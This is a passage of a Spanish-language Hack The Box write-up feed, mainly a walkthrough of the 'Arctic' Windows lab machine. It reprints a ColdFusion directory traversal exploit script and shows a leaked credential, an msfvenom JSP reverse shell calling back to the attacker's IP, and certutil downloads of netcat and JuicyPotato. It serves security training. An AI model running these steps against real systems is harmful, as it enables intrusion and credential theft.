36b5bcee8e0d7f4be426e8016250dd7f
root@passage:~#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Esto seria todo por esta ocasión 😄&lt;/p&gt;
</description>
        <pubDate>Mon, 17 Apr 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Passage</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Passage</guid>
        
        <category>CuteNews Explotation</category>
        
        <category>Code Analysis</category>
        
        <category>USBCreator D-Bus</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Arctic - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a estar resolviendo la maquina &lt;code&gt;Arctic&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; que es una maquina &lt;code&gt;Windows&lt;/code&gt; de dificultad &lt;code&gt;Facil&lt;/code&gt;. Para explotar esta maquina abusaremos una vulnerabilidad de &lt;code&gt;Adobe Coldfusion 8&lt;/code&gt; que nos permitira realizar un &lt;code&gt;directory path traversal&lt;/code&gt; y una vez conectados al &lt;code&gt;Coldfusion&lt;/code&gt; nos arovecharemos de una funcionalidad que tiene para extraer una credencial y crearemos un archivo &lt;code&gt;jsp&lt;/code&gt; malicioso para ganar acceso al sistema y finalmente para escalar privilegios como el usuario &lt;code&gt;administrator&lt;/code&gt; nos aprovecharemos del privilegio &lt;code&gt;Seimpersonateprivilege&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Arctic
❯ ls
 Arctic
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeración&quot;&gt;Enumeración &lt;a href=&quot;#enumeración&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.11
PING 10.10.10.11 (10.10.10.11) 56(84) bytes of data.
64 bytes from 10.10.10.11: icmp_seq=1 ttl=127 time=168 ms

--- 10.10.10.11 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 167.800/167.800/167.800/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde con un &lt;code&gt;ttl&lt;/code&gt; de &lt;code&gt;127&lt;/code&gt; correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;, ahora procederemos a el scaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;allPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.11 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-11 15:49 GMT
Initiating SYN Stealth Scan at 15:49
Scanning 10.10.10.11 [65535 ports]
Discovered open port 135/tcp on 10.10.10.11
Discovered open port 49154/tcp on 10.10.10.11
Discovered open port 8500/tcp on 10.10.10.11
Completed SYN Stealth Scan at 15:49, 26.54s elapsed (65535 total ports)
Nmap scan report for 10.10.10.11
Host is up, received user-set (0.13s latency).
Scanned at 2023-04-11 15:49:10 GMT for 27s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
135/tcp   open  msrpc   syn-ack ttl 127
8500/tcp  open  fmtp    syn-ack ttl 127
49154/tcp open  unknown syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.67 seconds
           Raw packets sent: 131085 (5.768MB) | Rcvd: 19 (836B)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Podemos ver puertos interesantes que se encuentran abiertos como &lt;code&gt;135 rpc&lt;/code&gt; , &lt;code&gt;8500 fmtp&lt;/code&gt; , &lt;code&gt;445 smb&lt;/code&gt; y &lt;code&gt;49154 unknown - desconocido&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p 135,8500,49154 10.10.10.11 -oN targets
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-11 15:51 GMT
Nmap scan report for 10.10.10.11
Host is up (0.29s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.62 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos la versión de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;135&lt;/td&gt;
      &lt;td&gt;MSRPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8500&lt;/td&gt;
      &lt;td&gt;FMTP?&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;49154&lt;/td&gt;
      &lt;td&gt;MSRPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Primero ya que &lt;code&gt;nmap&lt;/code&gt; no detecto el servicio del puerto &lt;code&gt;8500&lt;/code&gt; en vista que nos pregunta si es &lt;code&gt;fmtp?&lt;/code&gt;, puede tratarse de un servicio web, pero como tarda en responder al no encontrar nada no tiene claro el servicio.&lt;/p&gt;

&lt;p&gt;Vamos al navegador y veamos si el servicio es &lt;code&gt;http&lt;/code&gt;, nos tarda un poco pero efectivamente si es un servicio web.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dentro del dicrectorio &lt;code&gt;CFIDE&lt;/code&gt; vemos nuevos directorios interesantes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora vamos al direcotrio &lt;code&gt;administrator&lt;/code&gt;, vemos un panel administrativo de &lt;code&gt;Adobe Coldfusion 8&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Seguidamente veamos con &lt;code&gt;searchsploit&lt;/code&gt; si existen vulnerabilidades asociadas a &lt;code&gt;Adobe coldfusion&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit adobe coldfusion
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                                                                                  | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                                                                               | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                                                                                  | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)                                                                   | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution                                                          | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                                                                                        | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                                                                                    | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                                                                                   | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                                                                                  | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass                                                                                            | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                                                                               | multiple/remote/30210.rb
Adobe ColdFusion &amp;lt; 11 Update 10 - XML External Entity Injection                                                                                      | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                                                                            | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Scripting                                                         | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query String Cross-Site Scripting                                      | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-Site Scripting                                               | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Site Scripting                                                | cfm/webapps/33168.txt
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que hay varias vulnerabilidades asociadas como una concreta &lt;code&gt;Adobe ColdFusion 8 - Remote Command Execution (RCE)&lt;/code&gt;, que concretamente nos va a automatizar todo un proceso para ganar acceso a la maquina. Pero en este caso ya que vamos a realizar la explotación manualmente usaremos la asociada con &lt;code&gt;Adobe ColdFusion - Directory Traversal&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Pasemos a inspeccionar ese exploit y veamos en que consiste.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit -x multiple/remote/14641.py
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Veamos de que trata el exploit&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# Working GET request courtesy of carnal0wnage:
# http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
#
# LLsecurity added another admin page filename: &quot;/CFIDE/administrator/enter.cfm&quot;


#!/usr/bin/python

# CVE-2010-2861 - Adobe ColdFusion Unspecified Directory Traversal Vulnerability
# detailed information about the exploitation of this vulnerability:
# http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/

# leo 13.08.2010

import sys
import socket
import re

# in case some directories are blocked
filenames = (&quot;/CFIDE/wizards/common/_logintowizard.cfm&quot;, &quot;/CFIDE/administrator/archives/index.cfm&quot;, &quot;/cfide/install.cfm&quot;, &quot;/CFIDE/administrator/entman/index.cfm&quot;, &quot;/CFIDE/administrator/enter.cfm&quot;)

post = &quot;&quot;&quot;POST %s HTTP/1.1
Host: %s
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: %d

locale=%%00%s%%00a&quot;&quot;&quot;

def main():
    if len(sys.argv) != 4:
        print &quot;usage: %s &amp;lt;host&amp;gt; &amp;lt;port&amp;gt; &amp;lt;file_path&amp;gt;&quot; % sys.argv[0]
        print &quot;example: %s localhost 80 ../../../../../../../lib/password.properties&quot; % sys.argv[0]
        print &quot;if successful, the file will be printed&quot;
        return

    host = sys.argv[1]
    port = sys.argv[2]
    path = sys.argv[3]

    for f in filenames:
        print &quot;------------------------------&quot;
        print &quot;trying&quot;, f

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.send(post % (f, host, len(path) + 14, path))

        buf = &quot;&quot;
        while 1:
            buf_s = s.recv(1024)
            if len(buf_s) == 0:
                break
            buf += buf_s

        m = re.search('&amp;lt;title&amp;gt;(.*)&amp;lt;/title&amp;gt;', buf, re.S)
        if m != None:
            title = m.groups(0)[0]
            print &quot;title from server in %s:&quot; % f
            print &quot;------------------------------&quot;
            print m.groups(0)[0]
            print &quot;------------------------------&quot;

if __name__ == '__main__':
    main()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos ver que esta realizando una petición a &lt;code&gt;http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en&lt;/code&gt; para extraer un archivo local.&lt;/p&gt;

&lt;p&gt;Hagamos eso entonces y en el navegador agreguemos esa petición.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Efectivamente nos realiza un leak de una contraseña encryptada, asi que vallamos a nuestra web de confianza y tratemos de crackearla.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://crackstation.net/&quot;&gt;https://crackstation.net/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Logramos obtener la contraseña en texto plano&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora que ya contamos de credenciales validas &lt;code&gt;admin:happyday&lt;/code&gt;, vamos a logearnos en el panel.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Una vez ganes acceso a un &lt;code&gt;coldfusion&lt;/code&gt; y estes como un usuario administrador al igual que un wordpress o un joomla, se pueden hacer ciertas cosas, para ganar acceso.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Podemos ir a las opciones de &lt;code&gt;schedule task&lt;/code&gt; para crear una nueva tarea y a &lt;code&gt;mappings&lt;/code&gt; para ver las rutas expuestas.&lt;/p&gt;

&lt;p&gt;En &lt;code&gt;mappings&lt;/code&gt; podemos ver dos rutas expuestas. Siendo una de ellas &lt;code&gt;C:\ColdFusion8\wwwroot\CFIDE&lt;/code&gt;, que corresponde a la ruta que podiamos listar al conectarnos a la pagina. Eso quiere decir que si logramos crear un archivo y meterlo en esa ruta, esta claro que deberia cargarse el archivo en esta parte.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora nos vamos a &lt;code&gt;schedule task&lt;/code&gt;, podemos crear una tarea programada le damo un nombre. Y la idea es que en &lt;code&gt;URL&lt;/code&gt; podemos emplear un archivo de una fuente que le indiquemos y en &lt;code&gt;File&lt;/code&gt; podemos guardar ese contenido en una ruta dada.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora que tipo de archivos podemos emplear para realizar esto:&lt;/p&gt;

&lt;p&gt;Pues si investigamos un poco acerca de &lt;code&gt;coldfusion&lt;/code&gt; vemos que trabajan con archivos &lt;code&gt;asp&lt;/code&gt;, &lt;code&gt;jsp&lt;/code&gt; o &lt;code&gt;php&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Asi que vamos a intentar crear un archivo &lt;code&gt;JSP&lt;/code&gt; malicioso, para ello usaremos &lt;code&gt;msfvenom&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ msfvenom -l payloads | grep jsp
    java/jsp_shell_bind_tcp                                            Listen for a connection and spawn a command shell
    java/jsp_shell_reverse_tcp                                         Connect back to attacker and spawn a command shell
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que tenemos un &lt;code&gt;payload&lt;/code&gt; para otorgarnos una &lt;code&gt;shell&lt;/code&gt;, asi que usaremos este payload &lt;code&gt;java/jsp_shell_reverse_tcp&lt;/code&gt; y especificamos nuestra &lt;code&gt;ip&lt;/code&gt; de atacante y el puerto en el cual estaremos en escucha que sera el &lt;code&gt;443&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.8 LPORT=443 -o reverse.jsp
Payload size: 1495 bytes
Saved as: reverse.jsp
❯ ls
 reverse.jsp
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Una vez tengamos listo el archivo malicioso, vamos a crear la tarea programada.&lt;/p&gt;

&lt;p&gt;Espeficamos el nombre que queramos de la tarea &lt;code&gt;pwnarctic&lt;/code&gt;, en &lt;code&gt;url&lt;/code&gt; le indicamos que se conecte a nuestro equipo con el archivo &lt;code&gt;reverse.jsp&lt;/code&gt; que estaremos alojando y lo guardaremos en la ruta expuesta en la que tenemos acceso de ver los recursos &lt;code&gt;C:\ColdFusion8\wwwroot\CFIDE\reverse.jsp&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Realizamos el &lt;code&gt;submit&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Lo siguiente sera compartirnos el archivo &lt;code&gt;reverse.jsp&lt;/code&gt; en nuestro equipo, lo haremos con &lt;code&gt;python&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Una vez la tarea haya sido creada, para correrla debemos darle al primer boton en verde en la parte de &lt;code&gt;actions&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;y vemos que recibo la petición en mi maquina&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.11 - - [11/Apr/2023 17:15:00] &quot;GET /reverse.jsp HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Recargamos la ruta en la que teniamos acceso a listar los recursos y genial vemos el &lt;code&gt;reverse.jsp&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Quiere decir que si ahora pinchamos en el archivo &lt;code&gt;reverse.jsp&lt;/code&gt; al interpretarme el servidor el archivo &lt;code&gt;jsp&lt;/code&gt;, deberiamos ganar acceso al sistema.&lt;/p&gt;

&lt;p&gt;Le damos y con &lt;code&gt;ncat&lt;/code&gt; nos ponemos en escucha en el puerto &lt;code&gt;443&lt;/code&gt;, tambien haciendo uso de &lt;code&gt;rlwrap&lt;/code&gt; para obtener una consola mas interactiva.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rlwrap ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Esperamos unos segundos y ganamos acceso al sistema como el usuario &lt;code&gt;tolis&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;❯ rlwrap ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.11.
Ncat: Connection from 10.10.10.11:49672.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
whoami
arctic\tolis
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ahora nos vamos al directorio personal del usuario &lt;code&gt;tolis&lt;/code&gt;, podemos leer la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;cd C:\Users\tolis\Desktop
cd C:\Users\tolis\Desktop

type user.txt
type user.txt
b2d38d2f34b46b4189d147c805813fa4

C:\Users\tolis\Desktop&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Veamos que privilegios tenemos como el usuario &lt;code&gt;tolis&lt;/code&gt;, para ello usaremos el comando &lt;code&gt;whoami /priv&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tenemos habilitado el &lt;code&gt;seImpersonatePrivilege&lt;/code&gt;, podemos explotarlo de muchas formas, pero en esta ocasión lo haremos de una comoda:&lt;/p&gt;

&lt;p&gt;Primero vamos a descargarnos el &lt;code&gt;JuicyPotato&lt;/code&gt; del repositorio de &lt;code&gt;github&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/ohpe/juicy-potato&quot;&gt;https://github.com/ohpe/juicy-potato&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Nos vamos a los releases y concretamente nos descargamos el &lt;code&gt;juicyPotato.exe&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Ahora nos vamos a descargar el ejecutable de &lt;code&gt;ntcat&lt;/code&gt; para &lt;code&gt;windowns&lt;/code&gt; del siguiente enlace, concretamente la versión &lt;code&gt;1.12&lt;/code&gt;, debemos descomprimirlo y usar el &lt;code&gt;nc.64.exe&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://eternallybored.org/misc/netcat/&quot;&gt;https://eternallybored.org/misc/netcat/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Una vez tengamos ambos archivos, vamos a proceder a subirlos a la maquina victima&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
 JuicyPotato.exe   nc64.exe   reverse.jsp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para subirlos nos compartiremos un servicio con &lt;code&gt;python3&lt;/code&gt; y en la maquina victima haremos uso de &lt;code&gt;certutil.exe&lt;/code&gt;, para descargarnos los archivos, no debemos olvidar que debemos irnos a una ruta en la cual tengamos permisos como &lt;code&gt;C:\Windows\Temp&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;cd C:\Windows\Temp
cd C:\Windows\Temp

mkdir Privesc
mkdir Privesc

cd Privesc
cd Privesc

C:\Windows\Temp\Privesc&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos &lt;code&gt;certutil.exe&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;certutil.exe -f -urlcache -split http://10.10.16.8/nc64.exe nc64.exe
certutil.exe -f -urlcache -split http://10.10.16.8/nc64.exe nc64.exe
****  Online  ****
  0000  ...
  b0d8
CertUtil: -URLCache command completed successfully.

certutil.exe -f -urlcache -split http://10.10.16.8/JuicyPotato.exe JuicyPotato.exe
certutil.exe -f -urlcache -split http://10.10.16.8/JuicyPotato.exe JuicyPotato.exe
****  Online  ****
  000000  ...
  054e00
CertUtil: -URLCache command completed successfully.

C:\Windows\Temp\Privesc&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y recibimos la petición en nuestra maquina&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.11 - - [11/Apr/2023 17:59:47] &quot;GET /nc64.exe HTTP/1.1&quot; 200 -
10.10.10.11 - - [11/Apr/2023 17:59:50] &quot;GET /nc64.exe HTTP/1.1&quot; 200 -
10.10.10.11 - - [11/Apr/2023 18:00:02] &quot;GET /JuicyPotato.exe HTTP/1.1&quot; 200 -
10.10.10.11 - - [11/Apr/2023 18:00:04] &quot;GET /JuicyPotato.exe HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Verificamos que los archivos se subieron correctamente.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8

 Directory of C:\Windows\Temp\Privesc

13/04/2023  04:57     &amp;lt;DIR&amp;gt;          .
13/04/2023  04:57     &amp;lt;DIR&amp;gt;          ..
13/04/2023  04:57            347.648 JuicyPotato.exe
13/04/2023  04:57             45.272 nc64.exe
               2 File(s)        392.920 bytes
               2 Dir(s)   1.432.981.504 bytes free

C:\Windows\Temp\Privesc&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como ya tenemos ambos archivos, la idea es ahora que con el &lt;code&gt;JuicyPotato.exe&lt;/code&gt; podemos inyectar comandos de manera privilegiada.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;.\JuicyPotato.exe
JuicyPotato v0.1 

Mandatory args: 
-t createprocess call: &amp;lt;t&amp;gt; CreateProcessWithTokenW, &amp;lt;u&amp;gt; CreateProcessAsUser, &amp;lt;*&amp;gt; try both
-p &amp;lt;program&amp;gt;: program to launch
-l &amp;lt;port&amp;gt;: COM server listen port


Optional args: 
-m &amp;lt;ip&amp;gt;: COM server listen address (default 127.0.0.1)
-a &amp;lt;argument&amp;gt;: command line argument to pass to program (default NULL)
-k &amp;lt;ip&amp;gt;: RPC server ip address (default 127.0.0.1)
-n &amp;lt;port&amp;gt;: RPC server listen port (default 135)
